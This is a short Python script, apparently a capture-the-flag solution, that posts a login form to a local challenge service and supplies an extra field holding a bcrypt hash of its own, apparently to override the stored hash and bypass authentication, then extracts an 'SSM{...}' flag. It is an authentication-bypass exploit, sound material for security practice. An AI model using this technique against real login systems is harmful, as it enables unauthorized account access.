import re
import requests

r = requests.post(
    "http://127.0.0.1:50000/",
    data={
        "username": "abc",
        "password": "123",
        "abc": "$2y$10$t9yer1m9D1JIK2iHxiQ3geSJA13vYzwJqiBtP4yAKUyJLdCz9bcMK",
    },
)

print(re.search(r"SSM\{.+\}", r.text).group(0))
